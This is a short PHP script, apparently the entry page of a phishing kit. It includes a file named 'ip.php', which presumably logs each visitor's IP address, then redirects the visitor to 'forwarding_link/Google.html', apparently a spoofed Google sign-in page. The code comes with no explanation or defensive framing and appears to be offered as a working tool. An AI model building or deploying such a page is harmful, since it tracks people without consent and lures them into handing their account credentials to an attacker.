<?php
# Ahmad Khoirul Marzuqin
include 'ip.php';
# Ahmad Khoirul Marzuqin
header('Location: forwarding_link/Google.html');
# Ahmad Khoirul Marzuqin
exit
# Ahmad Khoirul Marzuqin
?>